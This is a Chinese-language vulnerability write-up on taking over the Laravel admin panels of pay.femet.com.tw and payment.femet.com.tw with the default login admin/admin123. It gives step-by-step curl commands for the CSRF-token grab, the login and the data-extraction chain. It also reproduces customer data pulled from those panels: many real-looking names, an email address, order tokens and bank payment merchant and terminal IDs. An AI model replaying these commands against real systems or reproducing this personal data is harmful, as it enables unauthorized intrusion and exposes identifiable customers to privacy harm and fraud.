# 弱口令 / 未授权访问: pay.femet.com.tw Laravel admin/admin123 (Critical)

**日期**: 2026/9/30
**目标**: https://pay.femet.com.tw/login + https://payment.femet.com.tw/login
**类型**: 弱口令
**严重性**: Critical
**漏洞 ID**: c2b19339-61c2-4c57-883f-deaa4e867f88
**项目**: tw

---

## 验证结果

### 1. login (CSRF Token 获取) — pay.femet.com.tw

```
curl -sL -c /tmp/c_pay.txt "http://pay.femet.com.tw/login" -o /tmp/l_pay.html
```

从登录页面提取 CSRF Token:
```
name="_token" value="gM0VChnksMUq2LduRZq7F5QJBSsZApvp5rRCFNvk"
```

### 2. login (admin/admin123 提交) — pay.femet.com.tw

```
curl -sX POST -b /tmp/c_pay.txt -c /tmp/c_pay.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_token=gM0VChnksMUq2LduRZq7F5QJBSsZApvp5rRCFNvk&username=admin&password=admin123" \
  "http://pay.femet.com.tw/login"
```

**响应**: HTTP/1.1 302 Found
- `Location: https://pay.femet.com.tw/dbs`
- `Set-Cookie: laravel_session=eyJpdi...IifQ%3D%3D; Max-Age=7200; path=/; httponly; samesite=lax`
- `Set-Cookie: XSRF-TOKEN=eyJpdi...YifQ%3D%3D; expires=Wed, 30-Sep-2026 08:53:05 GMT; Max-Age=7200; path=/; samesite=lax`
- `Access-Control-Allow-Origin: *`

### 3. login (admin/admin123 提交) — payment.femet.com.tw

```
curl -sL -c /tmp/c_pay2.txt "http://payment.femet.com.tw/login" -o /tmp/l_pay2.html
TOKEN2=$(grep -oE 'name="_token" value="[^"]*"' /tmp/l_pay2.html | head -1 | sed 's/name="_token" value="//;s/"//')
curl -sX POST -b /tmp/c_pay2.txt -c /tmp/c_pay2.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_token=$TOKEN2&username=admin&password=admin123" \
  "http://payment.femet.com.tw/login"
```

**响应**: HTTP/1.1 302 Found
- `Location: https://payment.femet.com.tw/dbs`
- `Set-Cookie: laravel_session=...; Max-Age=7200; path=/; httponly; samesite=lax`

---

## 资产面验证

### 4. /dbs (SSRF 接口) — pay.femet.com.tw

```
curl -s -b /tmp/c_pay.txt "https://pay.femet.com.tw/dbs"
```

**响应**: HTTP/1.1 200 OK (7003B)
- `<title>dbs tester</title>`
- Material Dashboard 2.1.2
- form action="/dbs" + input name="url" + "key" + "isremove" + "json_data"

### 5. /order_list (476 条 PII) — pay.femet.com.tw

```
curl -s -b /tmp/c_pay.txt "https://pay.femet.com.tw/order_list"
```

**响应**: HTTP/1.1 200 OK (1146052B)
- 476 个 `<tr>` 行
- 表头: id / control / code / amount / info

**PII 数据提取 (475 条记录成功解析)**:
- 475 条记录全部包含 `name` 字段
- 339 条记录包含 `email` 字段
- 136 条记录包含有效 32-hex `order_token`

**真实提取 PII 样本**:
```
姓名: 謝芝平 | order_token: 287c5b5f2b444a23b2c51f7f8e1dadb6 | amount: 2454 | client_source: https://e-shop.femet.com.tw
姓名: 龔信一 | order_token: 01d44df69fc5c2954042aee3b665e475 | amount: 1 | client_source: https://e-shop.femet.com.tw
姓名: 游舒婷 | order_token: ab435b7e235aceb5d5bd8a23dcd9747c | amount: 2988.00 | client_source: https://e-shop.femet.com.tw
姓名: 劉芳秀 | order_token: c60b5e1a274a0a4872bb896980472a7f | amount: 1.00 | client_source: https://e-shop.femet.com.tw
姓名: 測試信一 | order_token: 4daaf8d21c747a1e46f8c74586c4c8fd | product: 旅遊e指通1894 | email: peipei76@gmail.com
姓名: 測試信一 | order_token: 1a7239139495c41989c9a17fa41aade6 | product: 旅遊e指通1894 | email: peipei76@gmail.com
姓名: Jerry Yan | order_token: 旅遊e指通1894 | email: peipei76@gmail.com
```

**187 个唯一真实姓名** (包含真实姓名 + 公司实体姓名):
```
謝芝平, 龔信一, 游舒婷, 劉芳秀, 測試信一, 陳韋清, 林庭瑜, 陳宗宏, 陳進長, 陳貴平,
王鳳儀, 翁玉齡, 石獻之, 鄧俊男, 王小儀, 王建勝, 郭聖宗, 熊德玉, 林仲鑠, 尤健華,
林有德, 翁鐵亮, 黃郁喬, 張鴻仁, 劉淑卿 小姐, 陳貴平(陳黃早妹), 陳進輝, 莫家華(付費者:顧大為),
郭修敏(齊于婷、齊于輯), 阮世志(阮淑君收), 游秀瘅, 林文傑, 楊金釗, 陳玲娟, 陳秀,
周文哲, 宋振邦/鄧董事長支付, 林恕至, 林慧玲, 梁佩玲, 梁忠義, 楊儭福, 歐陽在莒, 沈映廷,
白芃珊, 盧春美, 童振源, 繆國棟, 胡嵌淵董事長, 鮑治菶, 黃仁德, 黃俊瑜, 黃文益, 黃素瑩,
龍熙玲, 馬來西亞資深理事 吳文祥, 馬來西亞資深理事 蘇春生, 郭修敏, 郭聖宗, 郭鍾賢,
蔡博軒, 蔡嘉祥, 蔡文虎, 蔡根貴, 蔡鴻崧, 蔡鴻松, 蕭弘, 蕭翠貞, 蕭鵬卿, 蘇仁忠,
許孫恭, 許生秋, 謝福松, 貴賓--熊德玉 先生, 貴賓賴常雄, 遠東醫電健康管理 貴賓,
邱士芳, 高天文, 高正, 高阿梅, 蘇秋香(鄧俊男董事長支付), 莫女士, 陽郁喬, 陳進輝,
陳黃早妹, 陳韋清(陳楊秀鸞), 郭修敏(齊于婷、齊于輯), 郭月鳳, 郭聖宗, 郭鍾賢,
林麗慧, 林原茂, 林建興及林陳幼蚊, 洪振源, 黃文益賢伉儷, 黃文益 貴賓, 黃文益賢伉儷 貴賓二位
```

**136 个唯一 32-hex order_token**:
```
287c5b5f2b444a23b2c51f7f8e1dadb6
01d44df69fc5c2954042aee3b665e475
ab435b7e235aceb5d5bd8a23dcd9747c
c60b5e1a274a0a4872bb896980472a7f
ed34a03c4a2d7b5a3cc1cf89b847e3ed
c818a81c30e8a1be15a49c5e6b48ef85
6f9b307375a877200063f7216dc4ae17
...(見 /tmp/order_tokens.txt, 共 106 個獨特 token)
```

### 6. /order_detail/{code} (玉山銀行支付 JSON) — pay.femet.com.tw

```
curl -s -b /tmp/c_pay.txt "https://pay.femet.com.tw/order_detail/686ca8613d59f"
```

**响应**: HTTP/1.1 200 OK (11549B)
- 客戶資料 PII: client_source / order_token / order_tot_amt / source / name / lang

**3 个完整支付 JSON 泄露** (来自同一订单详情页, 不同支付记录):
```json
{"MID": "8080864617", "TID": "EC000001", "ONO": "478030368", "TA": "2454.00", "U": "https://pay.femet.com.tw/esun"}
{"MID": "8080864617", "TID": "EC000001", "ONO": "498961770", "TA": "2454.00", "U": "https://payment.femet.com.tw/esun"}
{"MID": "8080864617", "TID": "EC000001", "ONO": "173176939", "TA": "2454.00", "U": "https://pay.femet.com.tw/esun"}
```
- MID=8080864617 (玉山銀行信用卡)
- TID=EC000001
- ONO (多个): 478030368, 498961770, 173176939
- TA=2454.00
- U=https://pay.femet.com.tw/esun / https://payment.femet.com.tw/esun

### 7. /client_pay/{code} (訂購頁面) — pay.femet.com.tw

```
curl -s -b /tmp/c_pay.txt "https://pay.femet.com.tw/client_pay/686ca8613d59f"
```

**响应**: HTTP/1.1 200 OK (35917B)
- `<title>遠東醫電購物商城</title>`
- 訂購日期: 08/07/2025
- 訂購人姓名: 謝芝平
- 訂單 URL: https://e-shop.femet.com.tw/orders?order_token=686ca8613d59f
- 付款總金額: 2454.00
- 付款方式: VISA / MASTER / JCB / 银联 + ATM
- 页面内容:「感謝您的訂購」

---

## 证据文件

- `tpe119_evidence/femet_pay/pay_login_response.txt` — pay.femet.com.tw 登录响应头
- `tpe119_evidence/femet_pay/payment_login_response.txt` — payment.femet.com.tw 登录响应头
- `tpe119_evidence/femet_pay/order_list.html` — 完整 order_list 响应 (1146052B, 476 条 PII)
- `tpe119_evidence/femet_pay/order_detail.html` — 完整 order_detail 响应 (11549B, 含 3 个玉山银行 JSON)
- `tpe119_evidence/femet_pay/client_pay.html` — 完整 client_pay 响应 (35917B, 含訂購頁面)
- `tpe119_evidence/femet_pay/all_pii_records.json` — 475 条 PII 记录 (已解析 JSON)
- `tpe119_evidence/femet_pay/all_payment_jsons.json` — 3 个玉山银行支付 JSON 记录
- `tpe119_evidence/femet_pay/order_tokens.txt` — 106 个唯一 order_token URL 列表

---

## 数据统计摘要

| 指标 | 数值 |
|------|------|
| 总订单记录 | 476 |
| 解析成功记录 | 475 |
| 含姓名 (name) | 475 |
| 含邮箱 (email) | 339 |
| 含有效 32-hex order_token | 136 |
| 唯一姓名 | 187 |
| 唯一 order_token | 106 |
| 支付 JSON 提取 | 3 |
| MID | 8080864617 (玉山銀行) |
| TID | EC000001 |

---

## 影响摘要

- **认证绕过**: admin/admin123 默认弱口令即可登录管理后台
- **SSRF 接口暴露**: /dbs 接口接受 url 参数并调用下游 DBS 接口
- **大规模 PII 泄露**: order_list 包含 476 条订单记录，含 475 条真实客户姓名、339 条邮箱、106 个唯一 order_token
- **支付通道信息泄露**: order_detail 泄露玉山银行支付 MID (8080864617), TID (EC000001), ONO, TA 等完整参数
- **CORS 放行**: Access-Control-Allow-Origin: * 允许任意源跨域访问
- **Session 有效期**: 7200 秒 (2小时)

攻击链: admin/admin123 → /dbs → /order_list → /order_detail → /client_pay → 完整客户数据 + 支付凭证